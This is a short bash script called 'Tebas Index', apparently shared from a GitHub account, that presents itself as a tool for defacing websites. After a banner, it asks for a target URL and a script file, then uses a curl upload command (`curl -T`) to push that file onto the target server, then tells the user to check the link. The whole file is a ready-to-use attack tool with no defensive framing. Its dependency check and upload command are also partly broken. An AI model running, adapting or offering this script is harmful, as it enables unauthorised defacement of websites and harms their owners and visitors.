#!/usr/bin/bash
# Tebas Index
# Coded by Senja
# Github: github.com/thedarksec/Tebasindex

checkroot() {

if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi

}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://www.google.com > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
    printf "\e[1;77mPlease, check your TOR Connection! Just type \"tor\" or \"service tor start\"\n\e[0m"
    exit 1

fi

}

clearscreen() {

clear
reset
sleep 1

}

dependencies() {

command -v nano > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

banner() {

printf '\e[1;77m

       ______              __
      /\__  _\            /\ \
      \/_/\ \/     ___    \_\ \     __   __  _
         \ \ \   /` _ `\  /`_` \  /`__`\/\ \/`\
          \_\ \__/\ \/\ \/\ \L\ \/\  __/\/>  </
          /\_____\ \_\ \_\ \___,_\ \____\/\_/\_\
          \/_____/\/_/\/_/\/__,_ /\/____/\//\/_/


'

}

template() {

printf "\n"
printf "\e[0m[\e[1;94m#\e[0m] Tebas Index Deface Website\n"
printf "\e[0m[\e[1;93m*\e[0m] Coded by Senja\n"
printf "\e[0m[\e[1;96m&\e[0m] My Github: @thedarksec\n"
sleep 1
printf "\n"


}

ready() {

read -p $'\e[0m[\e[1;95m?\e[0m\e[0m] \e[1;77mWeb Target: \e[0m' link
read -p $'\e[0m[\e[1;92m+\e[0m\e[0m] \e[1;77mInput Script: \e[0m' script

sleep 1.5
printf "\n\e[0m[\e[1;91m!\e[0m] \e[1;77mChecking...\n"
echo
sleep 3

curl -T /storage/emulated/0/ $script $link

printf "\n\e[0m[\e[1;96m#\e[0m] \e[1;77mPlease see the link. \n\e[0m"
echo
exit 1
echo

}

#checkroot
#checktor
#dependencies
clearscreen
banner
template
ready
